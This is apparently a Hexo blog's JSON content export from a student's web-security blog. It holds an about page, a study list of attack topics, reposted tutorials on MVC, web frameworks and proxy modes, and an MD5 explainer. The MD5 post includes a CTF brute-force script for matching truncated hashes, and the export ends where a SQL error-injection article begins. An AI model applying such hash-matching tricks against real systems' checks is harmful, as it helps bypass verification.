{"meta":{"title":"Crlwebby","subtitle":"Believe in yourself!","description":"web security","author":"crlwebby","url":"https://crlwebby.github.io","root":"/"},"pages":[{"title":"自我介绍","date":"2020-07-12T01:58:02.000Z","updated":"2021-02-02T06:46:31.559Z","comments":true,"path":"about/index.html","permalink":"https://crlwebby.github.io/about/","excerpt":"","text":"基本信息：HDU在读；爱跑步爱网球；偶尔看番；日常丧；内心敏感脆弱；人际交往能力堪忧 目前状况：学计算机为了恰饭，但也不甘心只做一个普通码农，心里还有点梦想； 我的心理脆弱，容易自我影响容易受他人影响变得自闭，正在企图通过读书改善； 我的体育很弱鸡，希望跑步+健身+网球三位一体提高自己的运动能力； 我的脑中没有什么思想，也没看过太多的书，基本上是一个很浅薄的人，不懂史不懂哲不懂政治； 大一一年没给我带来太多东西，甚至可以说是荒废了整整一年，似乎什么也没学到； 我处在人生的最低谷：交际圈子最小、体育最弱、成绩最差、梦想最小、自控力最弱； 但会好起来的 行动指南：人生目的：探索世界的奥秘 行动纲领：从事安全，拓展技术；数学其次，等同健身；不废文学，不废英语 Anyway,flag立在这里了，要像荣儿一样心无旁骛啊！！！！ 欢迎联系QQ：1303965943。记得要写明联系我的原因哈。"},{"title":"学习任务","date":"2021-01-24T13:50:09.000Z","updated":"2021-02-02T06:47:26.367Z","comments":true,"path":"issues/index.html","permalink":"https://crlwebby.github.io/issues/","excerpt":"","text":"前端： 博客增加摘要和阅读全文部分，写好layout模板 学习hexo主题开发，把自己的博客页面是如何生成的搞搞明白（大工程） 继续完善宾馆管理系统（数据库大作业）的前端页面，用HTML、CSS、JavaScript搞定； 测试： 学习requests库； 学习beautifulsoup库； 后端： 学习Python基础知识； 学习flask； 学习Django； 学习Laravel；（注：这三个框架的目标是入门，即了解运行流程以及如何利用其进行开发） 学习GO语言； 学习JAVA； 安全： SQL盲注； Xpath语法学习； HTTP走私攻击； SQL报错注入； floor|group_by报错注入； XSS； CSRF； 栈溢出； 基础知识： 读《算法》，刷算法题； 学无线通信； 复习计网知识，做lab，从零搭建一个网络； 复习操作系统知识，写点小实验； 复习编译原理知识，写点小东西； 读完《深入理解计算机系统》； 读完《编码-隐匿在软硬件背后的语言》 复习计组； ​ 填 坑 计 划 ​ 总觉得手头好像有好多好多事情要去干，但是心情低落的时候又什么都不干，于是干脆在自己首页放这样一个帖子，把自己需要干的一些事情都给记录下来，尽量是较大的、自我成长类的事情吧，类似于青年大学习这种东西就算了23333。 ​ ——写着写着好像炸了，项目越写越大，从博客添加摘要到自己写个操作系统，这完全不是同一个量级的项目啊=。=，总之，先这么留着吧，以后更加理性了应该会来修改的。"}],"posts":[{"title":"【转载】\"MVC框架详解\"","slug":"MVC","date":"2021-02-15T14:56:42.000Z","updated":"2021-02-15T15:19:27.321Z","comments":true,"path":"development/web/MVC/","link":"","permalink":"https://crlwebby.github.io/development/web/MVC/","excerpt":"原文地址 ：MVC Tutorial for Beginners: What is, Architecture &amp; Example What is MVC Framework?The Model-View-Controller (MVC) framework is an architectural pattern that separates an application into three main logical components Model, View, and Controller. Hence the abbreviation MVC. Each architecture component is built to handle specific development aspect of an application. MVC separates the business logic and presentation layer from each other. It was traditionally used for desktop graphical user interfaces (GUIs). Nowadays, MVC architecture has become popular for designing web applications as well as mobile apps. In this tutorial, you will learn more about- History of MVC Features of MVC MVC Architecture MVC Examples Popular MVC web frameworks Advantages of MVC: Key Benefits Disadvantages of using MVC 3-tier Architecture vs. MVC Architecture","text":"原文地址 ：MVC Tutorial for Beginners: What is, Architecture &amp; Example What is MVC Framework?The Model-View-Controller (MVC) framework is an architectural pattern that separates an application into three main logical components Model, View, and Controller. Hence the abbreviation MVC. Each architecture component is built to handle specific development aspect of an application. MVC separates the business logic and presentation layer from each other. It was traditionally used for desktop graphical user interfaces (GUIs). Nowadays, MVC architecture has become popular for designing web applications as well as mobile apps. In this tutorial, you will learn more about- History of MVC Features of MVC MVC Architecture MVC Examples Popular MVC web frameworks Advantages of MVC: Key Benefits Disadvantages of using MVC 3-tier Architecture vs. MVC Architecture History of MVC MVC architecture first discussed in 1979 by Trygve Reenskaug MVC model was first introduced in 1987 in the Smalltalk programming language. MVC was first time accepted as a general concept, in a 1988 article In the recent time, MVC pattern is widely used in modern web applications Features of MVC Easy and frictionless testability. Highly testable, extensible and pluggable framework Offers full control over your HTML as well as your URLs Leverage existing features provided by ASP.NET, JSP, Django, etc. Clear separation of logic: Model, View, Controller. Separation of application tasks viz. business logic, Ul logic, and input logic URL Routing for SEO Friendly URLs. Powerful URL- mapping for comprehensible and searchable URLs Supports for Test Driven Development (TDD) MVC Architecture Three important MVC the components are: Model: It includes all the data and its related logic View: Present data to the user or handles user interaction Controller: An interface between Model and View components Let’s see each other this component in detail: ViewA View is that part of the application that represents the presentation of data. Views are created by the data collected from the model data. A view requests the model to give information so that it resents the output presentation to the user. The view also represents the data from chats, diagrams, and table. For example, any customer view will include all the UI components like text boxes, drop downs, etc. ControllerThe Controller is that part of the application that handles the user interaction. The controller interprets the mouse and keyboard inputs from the user, informing model and the view to change as appropriate. A Controller send’s commands to the model to update its state(E.g., Saving a specific document). The controller also sends commands to its associated view to change the view’s presentation (For example scrolling a particular document). ModelThe model component stores data and its related logic. It represents data that is being transferred between controller components or any other related business logic. For example, a Controller object will retrieve the customer info from the database. It manipulates data and send back to the database or use it to render the same data. It responds to the request from the views and also responds to instructions from the controller to update itself. It is also the lowest level of the pattern which is responsible for maintaining data. MVC ExamplesLet’s see Model View Controller from daily life: Example 1: Let’s assume you go to a restaurant. You will not go to the kitchen and prepare food which you can surely do at your home. Instead, you just go there and wait for the waiter to come on. Now the waiter comes to you, and you just order the food. The waiter doesn’t know who you are and what you want he just written down the detail of your food order. Then, the waiter moves to the kitchen. In the kitchen waiter not prepare your food. The cook prepares your food. The waiter is given your order to him along with your table number. Cook then prepared food for you. He uses ingredients to cooks the food. Let’s assume that your order a vegetable sandwich. Then he needs bread, tomato, potato, capsicum, onion, bit, cheese, etc. which he sources from the refrigerator Cook final hand over the food to the waiter. Now it is the job of the waiter to moves this food outside the kitchen. Now waiter knows which food you have ordered and how they are served. In this case, 1234View&#x3D; YouWaiter&#x3D; ControllerCook&#x3D; ModelRefrigerator&#x3D; Data Let see one more example, Example 2:[ Car driving mechanism is another example of the MVC model. Every car consist of three main parts. View= User interface : ( Gear lever, panels, steering wheel, brake, etc.) Controller- Mechanism ( Engine) Model- Storage ( Petrol or Diseal tank) Car runs from engine take fuel from storage, but it runs only using mentioned user interface devices. Popular MVC web frameworksHere, is a list of some popular MVC frameworks. Ruby on Rails Django CakePHP Yii CherryPy Spring MVC Catalyst Rails Zend Framework CodeIgniter Laravel Fuel PHP Symphony Advantages of MVC: Key BenefitsHere, are major benefits of using MVC architecture. Easy code maintenance easy to extend and grow MVC Model component can be tested separately from the user Easier support for new type of clients Development of the various components can be performed parallelly. It helps you to avoid complexity by dividing an application into the three units. Model, view, and controller It only uses a Front Controller pattern which process web application requests through a single controller. Offers the best support for test-driven development It works well for Web apps which are supported by large teams of web designers and developers. Provides clean separation of concerns(SoC). Search Engine Optimization (SEO) Friendly. All classed and objects are independent of each other so that you can test them separately. MVC allows logical grouping of related actions on a controller together. Disadvantages of using MVC Difficult to read, change, to unit test, and reuse this model The framework navigation can some time complex as it introduces new layers of abstraction which requires users to adapt to the decomposition criteria of MVC. No formal validation support Increased complexity and Inefficiency of data The difficulty of using MVC with the modern user interface There is a need for multiple programmers to conduct parallel programming. Knowledge of multiple technologies is required. Maintenance of lots of codes in Controller 3-tier Architecture vs. MVC Architecture Parameter 3-Tier Architecture MVC Architecture Communication This type of architecture pattern never communicates directly with the data layer. All layers communicate directly using triangle topology. Usage 3-tier: widely used in web applications where the client, data tiers, and middleware a run on physically separate platforms. Generally used on applications that run on a single graphical workstation. Summary The MVC is an architectural pattern that separates an application into 1) Model, 2) View and 3) Controller Model: It includes all the data and its related logic View: Present data to the user or handles user interaction Controller: An interface between Model and View components MVC architecture first discussed in 1979 by Trygve Reenskaug MVC is a highly testable, extensible and pluggable framework Some popular MVC frameworks are Rails, Zend Framework, CodeIgniter, Laravel, Fuel PHP, etc. 个人感想虽然不能说国内文章写的有多么烂，但是可以说这篇文章写的是非常好，我也忘了为什么查MVC率先就查到这里来了，但是整篇读下来感觉是特别清楚，同时对现在的Web框架有了一个基本的认识3层模型就是普通的Web应用所使用的，例如我github上的那个数据库大作业。当然也类似，比如我数据库的内容就都放在了一个database.php类似的东西中，要用的时候require一下即可。MVC则更高级，其中有许多细节还是我所不了解的，比如view和model的交互就是我未曾体会过的。先懂了MVC，再针对性的学习框架，可以说事半功倍。这篇英文教程很值得一读，同时推荐下这个网站guru99.com，好多文章都特别类似，感觉都是高质量的文章。","categories":[{"name":"development","slug":"development","permalink":"https://crlwebby.github.io/categories/development/"},{"name":"web","slug":"development/web","permalink":"https://crlwebby.github.io/categories/development/web/"}],"tags":[{"name":"转载","slug":"转载","permalink":"https://crlwebby.github.io/tags/%E8%BD%AC%E8%BD%BD/"},{"name":"MVC","slug":"MVC","permalink":"https://crlwebby.github.io/tags/MVC/"}]},{"title":"【转载】\"web_framework\"","slug":"web-framework","date":"2021-02-15T14:36:47.000Z","updated":"2021-02-15T14:55:23.297Z","comments":true,"path":"development/web/web-framework/","link":"","permalink":"https://crlwebby.github.io/development/web/web-framework/","excerpt":"原文地址：【翻译】什么是 web 框架？（翻译原文地址已失效） 作者主页 Web 应用框架，简称为 web 框架，是编写 web 应用程序的基石。不管简单的博客系统，还是 Ajax 为主的应用，网络上所有的页面都是代码构成的。进来我发现，很多想学习诸如 Flask 或者 Django 等 web 框架的开发者，并不很了解 web 框架是什么，它们的作用和工作原理。这篇文章，我将会讲一下这个通常会被忽略的话题。希望读完这篇文章，你能比较深刻地理解 web 框架到底是什么，还有为什么会有 web 框架。这些知识将有利于你学习新的 web 框架，而且在选择 web 框架的时候有法可依。","text":"原文地址：【翻译】什么是 web 框架？（翻译原文地址已失效） 作者主页 Web 应用框架，简称为 web 框架，是编写 web 应用程序的基石。不管简单的博客系统，还是 Ajax 为主的应用，网络上所有的页面都是代码构成的。进来我发现，很多想学习诸如 Flask 或者 Django 等 web 框架的开发者，并不很了解 web 框架是什么，它们的作用和工作原理。这篇文章，我将会讲一下这个通常会被忽略的话题。希望读完这篇文章，你能比较深刻地理解 web 框架到底是什么，还有为什么会有 web 框架。这些知识将有利于你学习新的 web 框架，而且在选择 web 框架的时候有法可依。 WEB 是什么工作的？在讨论框架之前，我们要先了解一下网页是怎么工作。我们就从你在浏览器输入一个网址，摁下 enter 键说起。打开你的浏览器，输入 http://jeffknupp.com（译者注：原作者的个人网站首页），我们来看看你的浏览器做了那些事情（DNS 查询的 buffer 就略过），才能显示你看到的网页。 web servers，和 web … servers …浏览器接接收到的网页都是 HTML 文件，HTML 是一种描述网页内容和结构的语言。负责给浏览器发送 HTML 的程序称为 web server，容易混淆的是，这个应用程序所在的机器通常也被称为 web server。 最重要的一点是，所有的 web 应用做的事情就是把 HTML 内容发送给浏览器。不论这个 web 应用有多么复杂，最终的任务都是把 HTML（我故意忽略掉其他格式的内容，比如 JSON，CSS 文件，因为原理都是一样的）发送给浏览器。 问题来了：web 应用如何知道要发送什么内容给浏览器呢？答案：它会发送浏览器请求的内容。 HTTP浏览器从 web server 下载内容所用的是 HTTP 协议（协议在计算机科学中，指的是双方通信所共同遵循的数据格式和通信步骤）。HTTP 协议的基础是 请求-应答 (request-response) 模型。客户端（你的浏览器）请求 某台物理机上 web 应用的数据，web server 则负责 应答请求的数据。 有个重要的事情是：所有的通信都是客户端（你的浏览器）发起的。服务端（web server）是不可能主动连接你，发送没有请求的数据的。如果你收到了数据，只是因为你的浏览器主动请求了这些数据。 HTTP 方法HTTP 协议的每条消息都有对应的方法（method），不同的方法对应了客户端能发起的不同请求，也对应了客户端不同的意图。比如，请求 网页的 HTML 和提交一个表格在逻辑上是不同的，所以这两种方法需要两种不同的方法。 HTTP GET顾名思义，GET 方法就是从 web server 获取（get）数据，GET 请求也是目前最常用的 HTTP 请求。 处理 GET 请求的过程中，web 应用只需要返回请求的数据，无需其他操作。尤其是，不应该修改应用的状态（比如， GET 请求不应该导致一个新用户被创建）。因为这个原因，GET 请求通常被看做是 安全 的。 HTTP POST和网站的交互，明显不只是查看网页的。我们还会通过表格等形式发送数据给 web 应用，这些操作需要用到另外一种请求：POST。POST 请求通常会传递用户创建的信息，导致 web 应用执行某些动作。输入自己的信息，来注册某个网站就会用到 POST 请求，请求中会包含你输入的数据。 和 GET 请求不同的是， POST 请求通常会导致 web 应用状态的改变。上面提及的例子中，表单被提交后，一个新的用户会被创建。还有一点不同，POST 请求的结果可能不会返回 HTML 数据给客户端，客户端需要通过 response code 来判断操作是否成功。 HTTP response code正常情况下，web server 会返回 200 的 response code，意思是：我已经完成了你要我做的事情，并且一切都没有问题。response code 是三位的数字，每次应答都要包含一个 response code，来标识请求的结果。200 表示 OK，是 GET 方法常见的返回值。POST 请求经常会返还 204(No contnet)，表示：一切正常，但是我没有数据可以展示给你。 还需要注意的是：POST 请求发送给的 url，可能和数据发送出去的 url 不同。继续以我们的注册页面为例，注册表可能位于 http://foo.com/signup，点击 submit 之后，包含着注册数据的 POST 请求可能被发送到 http://foo.com/process_signup。POST 请求要发送到的地址，一般在注册表格的 HTML 源码里指定。 Web 应用掌握 GET 和 POST 方法就能做很多事情，因为它们是 web 上最常用的两个方法。总结一下，web 应用就是接收 HTTP 请求，然后返回 HTTP 应答，一般是包含请求数据的 HTML。POST 方法会导致 web 应用执行某些动作，例如在数据库添加一条记录。当然还有其他的 HTTP 方法，但目前我们只需要关心 GET 和 POST 就足够啦。 最简单的 web 应用长什么样呢？我们就来写一个监听在 80 端口的 web 应用，一旦和客户端建立连接，就等待客户端发起请求，并返回非常简单的 HTML。 这个程序是这样的： 12345678910111213141516171819import socketHOST = ''PORT = 80listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)listen_socket.bind((HOST, PORT))listen_socket.listen(1)connection, address = listen_socket.accept()request = connection.recv(1024)connection.sendall(\"\"\"HTTP/1.1 200 OKContent-type: text/html&lt;html&gt; &lt;body&gt; &lt;h1&gt;Hello, World!&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt;\"\"\")connection.close() （如果上面的程序报端口错误，可以把 PORT 的值修改成其他值，比如 8080。） 上面的代码只会接收一个连接和一个请求，不管请求的 URL 是什么，都会返回同样的 HTTP 内容，response code 是 200。（很明显，这不算真正的 web server）。在这个例子，我们告诉客户端，返回的数据格式为 HTML，而不是其他的格式，比如 JSON。 request 请求解析如果看一下上面例子中发送的 HTTP 请求（译者注：可以使用 chrome 的 inspect elements -&gt; Network，或者抓包工具 tcpdump 等工具查看发送的 HTTP 请求），就会发现它和应答很相似。请求的第一行是： 1&lt;HTTP Method&gt; &lt;URL&gt; &lt;HTTP version&gt; 在这个例子里就是 GET / HTTP/1.1。第一行后面跟着的是请求的头部（headers），比如 Accept: */*（表示可以接收任何格式的内容作为应答）。基本上就这么多。 我们发送的应答也是类似的格式，第一行是: 1&lt;HTTP version&gt; &lt;HTTP Status-Code&gt; &lt;Status-Code Reason-Phrase&gt; 这个例子中就是 HTTP/1.1 200 OK。然后是头部，和请求的头部一样。最后是应答的实际内容。注意：应答也可能是字符串或者二进制对象，头部的 Content-typ 就是来标识应答内容，让客户端来解析的。 web server 更多琐碎的细节要在上面的例子基础上继续扩展的话，还有很多需要我们来解决的问题： 怎么查看请求的 URL，然后返回不同的页面？ 除了 GET 请求，怎么处理 POST 请求？ 怎么处理很复杂的概念，比如 sessions 和 cookies？ 如何扩展这个应用，让它可以同时处理数千条连接？ 可以想象，没人会愿意每次编写 web 应用的时候都要自己处理这些问题。为了解决这个难题，就会存在很多的软件包帮你处理这些烦人的细节，让开发者可以把心思放到业务逻辑上。记住，不管 web 框架多么负责，其最核心的功能和我们上面的例子是一样的：监听客户端请求，然后返回 HTML 给客户端。 NOTE：客户端的框架和上面的内容迥然不同。 解决两个难题：路由（routing）和模板（templates）在构建 web 应用的所有的问题中，有两个比较突出： 怎么把请求 URL 和处理它的那部分代码对应起来？ 怎么动态地生产请求内容？包括所有要计算的值，和从数据库获取的信息？ 每个 web 框架解决这两个问题的方法都不太相同，我们就举 Flask 和 Django 的例子来说明这个问题。首先，我们还要来说一下 MVC 模式。 Django 中的 MVCDjango 采用 MVC 模式， 所以要求使用这个框架的代码都遵循这个模式。MVC*，是 *Model-View-Controller 的缩写，用来分离应用的不同责任。数据库表所代表的资源用 models 来表示，controllers 负责应用的业务逻辑和操作 models。Views 则负责动态生成代表页面的 HTML。 不过容易让人混淆的是，django 中 controllers 被称作 views*，而 *views 被称为 templates*。除了命名外，django 算是比较直接的 *MVC 架构。 Django 的路由（routing）机制这里说的路由（routing）就是把请求的 URL 对应到处理生成相关 HTML 的代码。最简单的例子，所有的请求都是相同的代码处理（就是我们之前编写的代码）。复杂一点呢，每个的 URL 都对应一个不同的 view function。比如，有个地方的逻辑是接收到 www.foo.com/bar 请求，就把它交给 handle_bar() 函数处理。我们可以这样依次编写出所有 url 对应的处理函数。 不过，这个方法有个致命伤：没有办法处理带有动态数据的 URL，比如说资源的 ID（例如 http://www.foo.com/users/3）。我们怎么把这个 URL 映射到函数，同时能传过去用户 ID 信息呢？ Django 采用的方法是利用正则表达式：用正则表达式匹配 URL，然后把匹配的数据作为参数传递给处理函数。比如，我可以说匹配 ^/users/(?P&lt;id&gt;\\d+)/$ 的 URL 会调用 display_user(id) 函数，其中 id 就是正则表达式括号里匹配的内容。利用这种方式，任何 /users/&lt;some number&gt; 类型的 URL 都能对应到 display_user 函数，并且正则表达式可以无限复杂，包含任意的关键字和未知参数。 Flask 的 路由机制Flask 采用的是另外一种方法。把 url 对应到函数参照的是 route() 装饰器。下面的 Flask 代码和上面提到的正则表达式代码功能相同： 123@app.route('/users/&lt;id:int&gt;/')def display_user(id): # ... 如你所见，装饰器使用的是简化版的正则表达式来传递参数，参数被 route 参数中 &lt;name:type&gt; 的指令捕获。要路由 /info/about.html 这样的页面，就需要 [@app.route](mailto:@app.route)(‘/info/about_us.html’)`。 根据模板生成 HTML继续上面的例子，一旦我们知道怎么把 URL 对应到逻辑代码，那么要怎么动态地生成 HTML，并且方便开发者手动编辑呢？Django 和 Flask 两者这次方法一样，那就是 —— HTML 模板。 HTML 模板 有点像 string.format()：预期的输出首先要用站位标识，然后再填入动态的数据。可以把这个网页想象成一个字符串，里面用括号标识动态的数据，最后调用 str.format() 生成最终的结果。Django 的 模板引擎和 Flask 采用的 jinja2 都是这个原理。 不过，并不是所有的模板引擎地位都一样。Django 的模板只支持简单的变成，而 Jinja2 却能让你执行任意的代码（当然并发完全可以，不过已经很近似）。Jinja2 很会 cache 渲染的结果，下次有同样的参数传过来的时候，就会直接从 cache 获取结果，而不需要重新渲染。 数据库集成Django，宣称“自带电池”（batteries included），然后也会包含 ORM（Object Relational Mapper）。ORM 的目的有两个：把 python 的类映射到数据的表结构，和通过封装隐藏不同数据库之间的差异（第一点是它更主要的功能）。没有人喜欢 ORM（因为不同域之间的 mapping 从不完美），不过这些缺点都是可以接受的。 Django 功能比较全面，Flask 作为一个微框架，并不自带 ORM（不过它很好兼容 SQLAlchemy，Django ORM 最大的竞争者）。 因为包含 ORM，Django 能够创建功能齐全的 CRUD 应用。 CRUD（Create Read Update Delete）是 web 框架（服务器端）最美好的地方，Django 和 Flask-SQLAlchemy 使得 CRUD 操作很直接。 Web 框架总结写到这，web 框架出现的目的也比较明确了：隐藏基础而又烦人的处理 HTTP 请求和应答的代码。至于要隐藏多少内容，就要看框架啦。Django 和 Flask 代表了两个极端。Django 每种情况都有涉及，而 Flask 标榜自己是“微框架“，只处理 web 程序最核心的功能，依赖其他三方插件来完成其他不常用的工作。 写了这么多，记住，所有的 python web 框架功能方式都一样：它们接收 HTTP 请求，然后分发任务，并生成 HTML，然后返回包含 HTML 的 HTTP 应答。事实上，所有的 server 端框架（除了 Javascript 框架）都是这么工作的。希望，看完这篇文章，你已经知道 web 框架的目的，也知道怎么去选择 web 框架啦。 个人感想这篇文章很详细的讲了Web框架的功能，主要也是和C语言的头文件比较相似，用来将重复代码集中起来，方便开发者。这也告诉了我们，学框架可以想办法学一个比较简单的框架，把基本的Web流程和细节搞懂即可，没有必要再去抓现在的一些大头框架去研究黑魔法（各种场景下的优化），这种东西以后遇到再学就是了，当然，研究框架安全的当我没说……","categories":[{"name":"development","slug":"development","permalink":"https://crlwebby.github.io/categories/development/"},{"name":"web","slug":"development/web","permalink":"https://crlwebby.github.io/categories/development/web/"}],"tags":[{"name":"Web框架","slug":"Web框架","permalink":"https://crlwebby.github.io/tags/Web%E6%A1%86%E6%9E%B6/"},{"name":"转载","slug":"转载","permalink":"https://crlwebby.github.io/tags/%E8%BD%AC%E8%BD%BD/"}]},{"title":"MD5的基本原理与MD5碰撞","slug":"md5","date":"2021-02-11T03:31:30.000Z","updated":"2021-02-11T08:15:58.840Z","comments":true,"path":"security/crypto/md5/","link":"","permalink":"https://crlwebby.github.io/security/crypto/md5/","excerpt":"摘要最近做CTF题目的时候又遇见了MD5碰撞，但是依然不懂那个所谓的可能性是如何计算出来的，于是打算自己花一两个小时的时间，把MD5的原理稍稍的梳理一下。","text":"摘要最近做CTF题目的时候又遇见了MD5碰撞，但是依然不懂那个所谓的可能性是如何计算出来的，于是打算自己花一两个小时的时间，把MD5的原理稍稍的梳理一下。 正文MD5算法原理 MD5是全称是Message-Digest Algorithm5（信息-摘要算法），由MD2、MD3、MD4发展而来的公开算法。 MD5是一种哈希算法，任意长度的输入经过处理后输出为128位的信息，且尽量使结果不冲突和信息不可逆。 MD5算法过程：MD5以512位为一个分组处理输入，每个分组分成16个32位的子分组，经过处理后，输出四个32位分组，这四个32位分组级联后生成一个128位的MD5值。 一、填充：如果输入信息长度（以bit记）模512不余448，那就要对输入信息进行填充，填充一个1和若干个0，使得信息长度变成512N+448，*若消息长度本身即为448，仍要填充512位，使其长度变成960** 二、记录：用64位记录输入信息的长度，然后添加到第一步的信息中，形成（N+1）*512的信息； 三、装入默认值：A=0x01234567,B=0x89ABCDEF,C=0xFEDCBA98,D=0x76543210。这里每个缓存均为32位（16进制四位，八个数） 四、分组：将512一组的数据进行分组，分成16个32位的子分组，将与幻数进行循环运算。 五、循环运算：这里借用一张MD5原理图进行说明 A、B、C、D四个寄存器默认的值进行运算，获得A‘，B’，C‘，D’，这是一步的运算。对于每一个分组512bit的消息，均要进行四轮，每轮十六步的运算，得到这一分组的128位结果，然后再以这个结果存入寄存器，作为下一组分组的初始值，直到最后一组的结果，即为MD5值。 图为四个逻辑函数，即MD5原理图中的“F”，四轮即分别使用四个函数，每个函数使用十六次。 第一轮用F，第二轮用G，第三轮用H，第四轮用I MD5原理图中的田字表示的是模2^32加法，为的是F的结果与A运算后仍为32位。 Mi即为分组的消息，最初是分成512一组，然后再分到组内32bit一组共16组，每一轮16步，要将16组消息全部用上。 第一轮中使用顺序为$$P_1(i)=i$$ 即i为多少就用第几个分组 第二轮中使用顺序为$$P_2(i)=(1 + 5i)\\mod 16$$由于3、5、7、11、13与16互质，因此当i遍历1-16时，1+k*i是一个完全剩余系，即同样遍历1-16没有重复 第三轮中使用顺序为$$P_3(i)=(5 + 3i)\\mod 16$$第四轮中使用顺序为$$P_3(i)=7i\\mod 16$$ki是固定常数，当然也可以通过计算获得。 在MD5原理图中，最后再次与B做模加运算之前，还有一次循环左移。这个也是有规定的 PS：图均来自于我们杭电伟大的胡耿然老师的密码学ppt，吹爆！ 至此，MD5的原理就全部讲解完毕。个人懒而且菜，没有尝试去实现MD5算法，无法贴源码/(ㄒoㄒ)/~~ MD5截断攻击下面进入正题，继续研究MD5截断。 Code: md5(code)[:6] ==d131dd MD5截断诸如此类，需要你提供一个字符串code，然后通过md5计算并截取前N位字符，使得其与给定的md5字符相同。 据我查阅得，大多数MD5截断的CTF姿势都是暴力，当然我也没有看过传说人物王小云的文章，也只能跟随着暴力……只是因为困惑于可能性的多少，所以写这篇文章探索一下。 MD5一般是一个128位的二进制序列，但是大多数MD5为了方便显示，通常写成16进制形式，即32位十六进制数。如果需要截取前N个，再加上十六进制的可能性为2^4，那就是2^4N种可能。对于这个六位的形式，粗略估计应该有一两千万种可能性。所以，如果写一个脚本，生成超过三千万的MD5值，应该可以找到任意前六位与给定字符相同的原字符。大概三千万*128bit，粗略估计就是3.57G…… 还是精确计算吧。2^24*2^7/2^30=2，就是2G。再加上要存储对应的原字符，差不多3G左右的文本肯定够了。 附一段网上的脚本：参考链接：【CTF】MD5截断比较 123456789101112131415# -*- coding: utf-8 -*-import hashlibsum = []j = 0f = open(\"gen_md5.txt\", \"a\")for i in xrange(1000000000): tmp = (hashlib.md5(str(i).encode(\"utf-8\")).hexdigest(),i) sum.append(tmp) j = j+1 if(j==10000000): for i in sum: f.write(\"&#123;0&#125; &#123;1&#125;\".format(i,\"\\n\")) j=0 sum = []f.close() 解释：对数字1-10亿（丧心病狂的十亿爆破……）的哈希值计算，并将计算结果存储在gen_md5.txt里 由于可能存在哈希碰撞，所以理论上来说，数据还是要设的比2^24要大一些的，但这个一百倍……反正我还没有把结果跑出来过，反而跑炸了一次，CPU 100%卡死了…… 寻找结果的话就自己写Python脚本或者用cat命令吧，打死也不可能用txt打开的，内存放3G文本受不了……","categories":[{"name":"security","slug":"security","permalink":"https://crlwebby.github.io/categories/security/"},{"name":"crypto","slug":"security/crypto","permalink":"https://crlwebby.github.io/categories/security/crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://crlwebby.github.io/tags/CTF/"},{"name":"密码学","slug":"密码学","permalink":"https://crlwebby.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"MD5","slug":"MD5","permalink":"https://crlwebby.github.io/tags/MD5/"}]},{"title":"【转载】\"代理中PAC模式和全局模式的区别\"","slug":"PAC-vs-whole","date":"2021-02-09T15:07:11.000Z","updated":"2021-02-15T14:54:58.823Z","comments":true,"path":"network/proxy/PAC-vs-whole/","link":"","permalink":"https://crlwebby.github.io/network/proxy/PAC-vs-whole/","excerpt":"原文地址：代理软件中PAC模式和全局模式的区别 作者主页 （该作者文章也是转载，但是没用标明原作者是谁或者原文链接……于是只能这样，转载的转载） 代理模式常见的模式有PAC模式和全局模式，那么这二者的差别是什么呢？一句话总结： PAC模式：国内网站依旧走本地网络，速度快，绝大部分国外网站都走代理，速度也快。全局模式：所有网站都走代理，访问国内网站速度变慢。","text":"原文地址：代理软件中PAC模式和全局模式的区别 作者主页 （该作者文章也是转载，但是没用标明原作者是谁或者原文链接……于是只能这样，转载的转载） 代理模式常见的模式有PAC模式和全局模式，那么这二者的差别是什么呢？一句话总结： PAC模式：国内网站依旧走本地网络，速度快，绝大部分国外网站都走代理，速度也快。全局模式：所有网站都走代理，访问国内网站速度变慢。 区别一：使用流量多少不一样。 PAC模式：节省流量。 全局模式：流量消耗较多。 区别二：运行速度快慢不一样。 PAC模式：国内网站依旧走本地网络，速度快，绝大部分国外网站都走代理，速度也快。。 全局模式：所有网站都走代理，访问国内网站速度变慢。 区别三：访问网站覆盖面不一样。 PAC模式：少部分国外网站不走代理，无法起到加速效果，甚至无法访问。 全局模式：可访问全球所有网站。 区别四：运行原理不一样。 PAC模式：所有http/socks数据经过代理服务器的转发送出。而只有支持socks5或者使用系统代理的软件才能使用Shadowsocks（一般的浏览器都是默认使用系统代理）。 全局模式：不要求应用程序遵循特定的操作系统平台，只是简单地传递数据包，而不必关心是何种应用协议（比如FTP、HTTP和NNTP请求）。 区别五：智能程度不一样。 PAC模式：是智能分流模式，根据规则去匹配你访问的网站，仅加速国外网站，国内网站不受影响，非常智能。 全局模式：机械的利用设计的程序进行访问网站，所有网站都走代理，智能化程度不高。 扩展资料： Shadowsocks 使用自行设计的协议进行加密通信。加密算法有AES、Blowfish、IDEA、RC4等，除创建TCP连接外无需握手，每次请求只转发一个连接，因此使用起来网速较快，在移动设备上也比较省电。 所有的流量都经过算法加密，允许自行选择算法，所以比较安全。Shadowsocks 通过异步I/O和事件驱动程序运行，响应速度快。 客户端覆盖多个主流操作系统和平台，包括Windows，OS X，Android和iOS系统和路由器(OpenWrt)等。Shadowsocks 专为移动设备和无线网络优化。 个人感想PAC有许多需要补充的点，从百度百科搜索而来。 一 PAC全称Proxy Auto Config，通常是一种代理脚本，包含一个Javascript形式的函数“FindProxyForURL(url,host)”，并用这个函数得到代理规则，然后用户利用这些代理规则设置代理服务器，进行可控制的代理访问，正如大多数梯子用PAC可以不经代理访问国内网站一样的设置。 Shadowsocks是以后有经济实力后必备的梯子，可以自己定制使用，不用再向现在这样窘迫和不可控了，以后慢慢折腾！","categories":[{"name":"network","slug":"network","permalink":"https://crlwebby.github.io/categories/network/"},{"name":"proxy","slug":"network/proxy","permalink":"https://crlwebby.github.io/categories/network/proxy/"}],"tags":[{"name":"网络","slug":"网络","permalink":"https://crlwebby.github.io/tags/%E7%BD%91%E7%BB%9C/"},{"name":"代理","slug":"代理","permalink":"https://crlwebby.github.io/tags/%E4%BB%A3%E7%90%86/"},{"name":"梯子","slug":"梯子","permalink":"https://crlwebby.github.io/tags/%E6%A2%AF%E5%AD%90/"},{"name":"转载","slug":"转载","permalink":"https://crlwebby.github.io/tags/%E8%BD%AC%E8%BD%BD/"}]},{"title":"【转载】mysql报错注入之floor原理探究","slug":"floor-injection","date":"2021-02-02T07:06:47.000Z","updated":"2021-02-15T14:53:48.757Z","comments":true,"path":"security/CTF/floor-injection/","link":"","permalink":"https://crlwebby.github.io/security/CTF/floor-injection/","excerpt":"原文地址 ：Mysql报错注入之floor(rand(0)*2)报错原理探究 作者首页 一、简述floor报错注入是利用 `select 